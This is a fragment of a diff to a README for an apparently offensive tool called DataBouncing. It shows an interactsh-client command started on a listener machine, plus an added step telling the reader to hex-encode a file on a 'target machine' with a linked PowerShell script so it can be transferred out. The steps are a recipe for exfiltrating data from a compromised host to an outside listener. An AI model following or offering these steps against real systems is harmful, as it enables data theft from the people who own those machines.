@@ -10,10 +10,10 @@ Run this command on your listener machine to start the InteractSh Client and def
 interactsh-client -v -o /root/DataBouncing/logs.txt
 ```
 
-
+Next on the target machine you are going to want to convert a file to Hex and prepare it for transfer with this script:
 [chunks](https://github.com/Unit-259/DataBouncing/blob/main/Client/Convert-FileToHexChunks.ps1)
 
-`$hex = Convert-FileToHexChunks -FilePath .\AST-Test.txt`
+
 
 ```
 foreach ($i in $x.PSObject.Properties) {echo $i.Value}
